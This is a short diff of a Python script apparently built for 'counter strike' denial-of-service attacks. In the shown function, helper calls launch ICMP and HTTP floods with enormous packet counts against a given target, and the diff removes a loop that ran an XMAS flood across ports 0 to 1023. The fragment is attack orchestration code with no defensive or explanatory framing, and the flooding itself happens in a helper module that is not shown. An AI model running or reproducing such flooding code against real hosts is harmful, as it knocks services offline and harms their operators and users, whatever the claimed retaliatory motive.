@@ -19,10 +19,6 @@ def full_scale_counter_strike(target):
     counter_strike_helper.icmpflood(target,200000000) # ICMP
     print("Performing HTTP Flood")
     counter_strike_helper.attack_http_flood(target,80,3000000000) # http flood
-    print("Performing XMAS Flood")
-    for port in range(0,1024): # xmas flood
-        counter_strike_helper.xmasflood(target,port,5000000)
-
 
 def fast_counter_strike(target):
     print("Full Counterstrike Initiated...")
